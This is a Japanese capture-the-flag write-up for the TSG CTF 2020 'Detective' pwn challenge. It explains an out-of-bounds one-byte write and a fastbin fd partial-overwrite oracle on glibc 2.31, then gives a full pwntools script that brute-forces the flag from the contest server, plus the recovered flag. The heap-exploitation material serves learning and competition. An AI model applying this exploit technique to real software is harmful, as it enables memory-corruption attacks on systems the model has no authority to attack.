---
tags: pwn
---

# TSG CTF 2020 - Detective

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## Writeup

### Outline

Heap上にインデックスで指定したフラグ(1バイトのみ)が配置される。しかしチャンクに対してshow機能が無いので読むことは叶わない。
そこでfastbin中のfdの末尾1バイトを書き換えて事前に書き込み可能な部分を指すようにする。ここがmallocされる際にサイズチェックが走るので事前に対応する箇所を予想してサイズヘッダを用意しておく。
もし正しければ特にabortしないのでそれをオラクルにしてフラグの先頭から全探索する。

### checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Binary

* libc: 2.31
* 保持可能ポインタ: 2
* malloc可能サイズ: 0x100未満
* コマンド
    * allocate: `calloc(1, size)`して中身を書き込む
    * deallocate: 指定インデックスにあるポインタをfreeする
    * read_flag: 指定インデックスにあるポインタから位置を指定してフラグ(事前に指定たインデックスにある1文字)を書き込む、正の値であれば位置は幾らでも良いのでOOBになる

### フラグ形式

この問題はフラグを先頭から確定させていくのだが、インデックスに対しそれがどの文字であるのか総当りで調べる。フラグの文字の制約は次の`sanity_check`関数で示されている。

```c
void sanity_check(char *pcParm1)

{
  int iVar1;
  size_t sVar2;
  int local_c;
  
  sVar2 = strlen(pcParm1);
  if (sVar2 != 0x28) {
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  iVar1 = strncmp(pcParm1,"TSGCTF{",7);
  if (iVar1 != 0) {
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  if (pcParm1[0x27] != '}') {
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  local_c = 7;
  while( true ) {
    if (0x26 < local_c) {
      return;
    }
    if (((pcParm1[(long)local_c] < 'a') || ('f' < pcParm1[(long)local_c])) &&
       ((pcParm1[(long)local_c] < '0' || ('9' < pcParm1[(long)local_c])))) break;
    local_c = local_c + 1;
  }
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```

フラグは16進数で使われる文字(`[0-9a-f]`)だけで構成されていることがわかる。

### Vuln

`read_flag`関数にOOBが存在する

```c
void read_flag(void)

{
  uint p_idx;
  uint uVar1;
  
  printf("index > ");
  p_idx = get_index();
  if (*(long *)(ptrs + (ulong)p_idx * 8) == 0) {
    puts("create a buffer");
  }
  else {
    if (flag == '\0') {
      puts("you have already read it");
    }
    else {
      printf("at > ");
      uVar1 = get_num();
      *(char *)(*(long *)(ptrs + (ulong)p_idx * 8) + (ulong)uVar1) = flag;
      flag = '\0';
    }
  }
  return;
}
```

`at > `で書き込むアドレスを相対的に指定出来るのだが、正の数字であれば幾らでも良い。よって書き込みたいチャンクの下に既にfreeされたチャンクがあればそのfd, nextを書き換えることが可能
今回はcallocが使われてtcacheからチャンクは確保されないのでfastbinにあるチャンクを狙ってfdを書き換えた。

### fd書き換え

callocは何故かtcacheから確保しないのでfastbinを使う。そのためにまずはtcacheを全部埋める。
今回はfdを書き換えられるサイズと、その書き込みの踏み台にするチャンクのサイズの2つを使う。
次のようなチャンク配置を用意する

```
target: Bとアドレスの最下位バイトだけが違うチャンク
A(freed -> used): read_flagで指定するチャンク
B(freed): fd -> somewhere
C(freed): fd -> B, read_flagでfdを書き換えてfdをtargetに向ける
```

インデックスが2つまでしか持てないという都合で一旦fastbinに退避させておいたAを再度確保して`read_flag`の書き込み先に指定し、`at`の指定でCのfdの末尾1バイトを変えることでtarget付近にfdを向ける
フラグの形式は前述した通りなので`C->fd`の末尾は`0x30 ~ 0x39, 0x61 ~ 0x66`になる。よってもしここにCと同じサイズのチャンクヘッダがあれば何度かのcallocでここが確保されるはずである。
では逆にここに無かった場合はどうなるかというとfastbinには確保時にチャンクのサイズヘッダを確認するという処理が走るのでもしまともなサイズヘッダが無ければabortする。というわけでこれがフラグ判定オラクルになる
そういうわけでtargetチャンクを生成する際にどの文字がフラグに来るかを想定し、事前にチャンクヘッダを用意しておく

## Code

```python
from pwn import p64, u64, ELF, process, remote


def select(s, sel, c=b"> "):
    s.recvuntil(c)
    s.sendline(str(sel))


def alloc(s, idx, size, data=b"/bin/sh"):
    select(s, 0)
    s.recvuntil(b"index > ")
    s.sendline(str(idx))
    s.recvuntil(b"size > ")
    s.sendline(str(size))
    s.recvuntil(b"data > ")
    s.sendline(data)


def dealloc(s, idx):
    select(s, 1)
    s.recvuntil(b"index > ")
    s.sendline(str(idx))


def _read(s, idx, at):
    select(s, 2)
    s.recvuntil(b"index > ")
    s.sendline(str(idx))
    s.recvuntil(b"at > ")
    s.sendline(str(at))


if __name__ == "__main__":
    """
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    """
    """
        - deallocate時にポインタはクリアされる
        - フラグを1文字だけ読み込んでHeapからの相対書き込みが可能
    """
    """
        1. fastbin: A -> Bとなっている時に相対書き込みでAのfdの末尾バイトをflag[i]にすることが出来る
        2. すると次の次の確保アドレスが確定する
        3. 事前にどのフラグかを予想しておき、そこが正常に取られるように偽装チャンク(というかヘッダ)を用意しておく
        4. もし無事に取得出来たらフラグ確定(オラクルになる)
        5. 最悪アクセス数は32*16
    """

    flag = ""
    size = 0x78
    for flag_idx in range(7, 39):
        for c in "0123456789abcdef":
            # s = process("./detective")
            s = remote("35.221.81.216", 30001)
            s.recvuntil(b"index > ")
            s.sendline(str(flag_idx))
            # fill tcache
            for _ in range(7):
                alloc(s, 1, size)
                dealloc(s, 1)
                alloc(s, 1, 0x18)
                dealloc(s, 1)

            alloc(s, 0, 0x18)
            dealloc(s, 0)
            pad = ord(c) - 0x10 - 0x8
            payload = b"a" * pad + p64(0x81)
            alloc(s, 0, size, payload)
            alloc(s, 1, size)

            dealloc(s, 0)
            dealloc(s, 1)

            alloc(s, 0, 0x18)
            _read(s, 0, 0xa0)

            alloc(s, 0, size)
            try:
                alloc(s, 0, size)  # if size is valid, I can get a chunk!!
                print("[+] found:", c)
                flag += c
                break
            except EOFError:
                pass

    print(f"TSGCTF{{{flag}}}")

```

## Flag

`TSGCTF{67f7d58ac9301f273d16aec9829847b0}`

## 感想

CTF始めたてのWebやってた頃に好きだったBlind SQLインジェクションを思い出せて楽しかったです。これまでやってきた問題と違って知識や手法の他に別ベクトルでの発想を要求されるのが斬新でした。

1桁Solves(5人目だった)の内に解けたのと結構すんなり解法が出てきた(実装が面倒だった、見返すと全然書いてないけど)のでここ1ヶ月の成果が出たのではないでしょうか?

実装はチームメイトに投げましたがKarteも以前見た資料を元に解法を提案出来たので少しずつPwnの貢献度が上がって嬉しいです(でもRACHELLはHouse of Corrosionなんもわからんで死んだ)

院試の願書出したらまたこのコーナー再開します、早ければ火曜に